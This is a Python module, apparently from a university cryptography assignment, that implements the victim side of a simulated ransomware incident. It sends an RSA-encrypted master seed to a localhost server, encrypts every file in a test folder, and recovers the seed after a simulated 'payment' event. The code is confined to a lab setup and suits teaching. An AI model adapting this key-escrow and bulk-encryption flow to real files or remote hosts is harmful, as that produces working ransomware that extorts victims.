import base64
import json
import socket
import sys
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

from material_profesor.generador_semillas import generar_semilla_maestra
from compartido.protocolo import enviar_mensaje, recibir_mensaje
from victima.cifrado import cifrar_archivo, descifrar_archivo, comparar_archivos
from victima.cliente import (
    preparar_identidad,
    cargar_identidad,
    verificar_registro_firmado,
    cargar_clave_confiable,
    CARPETA_ESTADO,
)


HOST = "127.0.0.1"
PUERTO = 5000

CARPETA_TRABAJO = Path("archivos_prueba/trabajo")
CARPETA_CIFRADOS = Path("archivos_prueba/cifrados")
CARPETA_RECUPERADOS = Path("archivos_prueba/recuperados")
CARPETA_ORIGINALES = Path("archivos_prueba/originales")


def _oaep():
    return padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    )


def conectar():
    conexion = socket.create_connection((HOST, PUERTO), timeout=10)
    conexion.settimeout(10)
    return conexion


def registrar_y_obtener_pkS(identidad, conexion, usar_firma=True):
    from victima.cliente import crear_mensaje_registro

    mensaje = crear_mensaje_registro(identidad)
    enviar_mensaje(conexion, mensaje)
    respuesta = recibir_mensaje(conexion)

    if respuesta.get("tipo") == "error":
        raise RuntimeError(f"Servidor rechazó el registro: {respuesta.get('mensaje')}")

    if respuesta.get("tipo") != "registro_ok":
        raise RuntimeError(f"Respuesta inesperada: {respuesta}")

    if respuesta.get("idV") != identidad["idV"]:
        raise RuntimeError("idV no coincide")

    ruta_confianza = CARPETA_ESTADO / "servidor_confiable.pem"
    if usar_firma and ruta_confianza.exists():
        clave_confiable = cargar_clave_confiable(ruta_confianza)
        verificar_registro_firmado(respuesta, clave_confiable)
        print("  Firma del servidor verificada (Ed25519).")
    else:
        print("  Aviso: no hay clave de confianza local; se acepta pkS sin verificar firma.")

    pkS_pem = base64.b64decode(respuesta["pkS"], validate=True)
    pkS = serialization.load_pem_public_key(pkS_pem)
    if not isinstance(pkS, rsa.RSAPublicKey) or pkS.key_size < 2048:
        raise RuntimeError("pkS inválida")
    return pkS


def entregar_semilla(identidad, pkS, conexion):
    sV = generar_semilla_maestra()
    if len(sV) != 32:
        raise RuntimeError("El generador no devolvió 32 bytes")

    cifrado = pkS.encrypt(sV, _oaep())
    mensaje = {
        "tipo": "entrega_semilla",
        "idV": identidad["idV"],
        "semilla_cifrada": base64.b64encode(cifrado).decode("ascii"),
    }
    enviar_mensaje(conexion, mensaje)
    respuesta = recibir_mensaje(conexion)

    if respuesta.get("tipo") == "error":
        raise RuntimeError(f"Error en entrega: {respuesta.get('mensaje')}")
    if respuesta.get("tipo") != "confirmacion_semilla":
        raise RuntimeError(f"Respuesta inesperada: {respuesta}")

    print("  Semilla entregada y confirmada por el servidor.")
    return sV


def cifrar_archivos_trabajo(identidad, sV):
    if not CARPETA_TRABAJO.exists():
        raise FileNotFoundError(
            f"No existe {CARPETA_TRABAJO}. Copia primero los originales."
        )

    CARPETA_CIFRADOS.mkdir(parents=True, exist_ok=True)
    archivos = sorted(
        p for p in CARPETA_TRABAJO.iterdir()
        if p.is_file() and not p.name.startswith(".")
    )
    if not archivos:
        raise RuntimeError("No hay archivos en la carpeta de trabajo")

    registros = []
    for i, ruta in enumerate(archivos):
        salida = CARPETA_CIFRADOS / f"{ruta.name}.enc.json"
        if salida.exists():
            salida.unlink()
        reg = cifrar_archivo(ruta, salida, sV, identidad["idV"], i)
        registros.append(reg)
        print(f"  Cifrado: {ruta.name}  (contador={i})")

    meta = {
        "idV": identidad["idV"],
        "archivos": [r["archivo"] for r in registros],
        "contadores": [r["contador"] for r in registros],
    }
    (CARPETA_CIFRADOS / "incidente.json").write_text(
        json.dumps(meta, indent=2), encoding="utf-8"
    )
    print(f"  Total: {len(registros)} archivos cifrados en {CARPETA_CIFRADOS}")
    return registros


def solicitar_recuperacion(identidad, conexion):
    mensaje = {
        "tipo": "solicitud_recuperacion",
        "idV": identidad["idV"],
        "evento": "pago",
    }
    enviar_mensaje(conexion, mensaje)
    respuesta = recibir_mensaje(conexion)

    if respuesta.get("tipo") == "error":
        raise RuntimeError(f"Error en recuperación: {respuesta.get('mensaje')}")
    if respuesta.get("tipo") != "recuperacion_ok":
        raise RuntimeError(f"Respuesta inesperada: {respuesta}")

    cifrado = base64.b64decode(respuesta["semilla_cifrada"], validate=True)
    sV = identidad["clave_privada"].decrypt(cifrado, _oaep())
    if len(sV) != 32:
        raise RuntimeError("Semilla recuperada de longitud incorrecta")
    print("  Semilla recuperada mediante pago.")
    return sV


def descifrar_y_comparar(identidad, sV):
    CARPETA_RECUPERADOS.mkdir(parents=True, exist_ok=True)
    cifrados = sorted(CARPETA_CIFRADOS.glob("*.enc.json"))
    if not cifrados:
        raise RuntimeError("No hay archivos cifrados")

    ok = 0
    for ruta in cifrados:
        dest = descifrar_archivo(ruta, CARPETA_RECUPERADOS, sV, identidad["idV"])
        original = CARPETA_ORIGINALES / dest.name
        if original.exists():
            igual = comparar_archivos(original, dest)
            if igual:
                ok += 1
        else:
            print(f"  (sin original para comparar: {dest.name})")
            ok += 1
    print(f"  Recuperados correctamente: {ok}/{len(cifrados)}")
    return ok == len(cifrados)


def flujo_incidente_completo():
    print("\n=== FLUJO COMPLETO DEL INCIDENTE (Modelo B) ===\n")

    identidad = preparar_identidad()
    print(f"idV = {identidad['idV']}")

    print("\n[1] Registro con el servidor...")
    with conectar() as conexion:
        pkS = registrar_y_obtener_pkS(identidad, conexion)
    print("  pkS recibida.")

    print("\n[2] Generación y entrega de la semilla maestra...")
    with conectar() as conexion:
        sV = entregar_semilla(identidad, pkS, conexion)

    print("\n[3] Cifrado de los archivos de trabajo...")
    cifrar_archivos_trabajo(identidad, sV)

    print("\n=== INCIDENTE COMPLETADO ===")
    print("La semilla NO se ha guardado en disco (como exige el enunciado).")
    print("Puedes cerrar esta víctima. Los archivos cifrados permanecen en:")
    print(f"  {CARPETA_CIFRADOS.resolve()}")
    print("\nPara recuperar por pago, vuelve a ejecutar esta aplicación")
    print("y elige la opción de recuperación.")


def flujo_recuperacion_pago():
    print("\n=== RECUPERACIÓN POR PAGO ===\n")

    identidad = cargar_identidad()
    print(f"idV = {identidad['idV']}")

    with conectar() as conexion:
        print("[5a] Solicitando recuperación (evento de pago)...")
        sV = solicitar_recuperacion(identidad, conexion)

    print("\n[6] Descifrando y comparando con originales...")
    exito = descifrar_y_comparar(identidad, sV)

    if exito:
        print("\n=== RECUPERACIÓN EXITOSA ===")
    else:
        print("\n=== HUBO DIFERENCIAS ===")
        sys.exit(1)


def main():
    CARPETA_TRABAJO.mkdir(parents=True, exist_ok=True)
    CARPETA_ORIGINALES.mkdir(parents=True, exist_ok=True)

    if not any(CARPETA_TRABAJO.iterdir()) and any(CARPETA_ORIGINALES.iterdir()):
        import shutil
        for f in CARPETA_ORIGINALES.iterdir():
            if f.is_file():
                shutil.copy2(f, CARPETA_TRABAJO / f.name)
        print(f"Archivos de trabajo preparados desde {CARPETA_ORIGINALES}")

    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "incidente":
            flujo_incidente_completo()
        elif cmd == "pago":
            flujo_recuperacion_pago()
        elif cmd == "identidad":
            prep = preparar_identidad()
            print("idV:", prep["idV"])
        else:
            print("Uso: python -m victima.aplicacion [incidente|pago|identidad]")
        return

    print("Uso: python -m victima.aplicacion [incidente|pago|identidad]")


if __name__ == "__main__":
    main()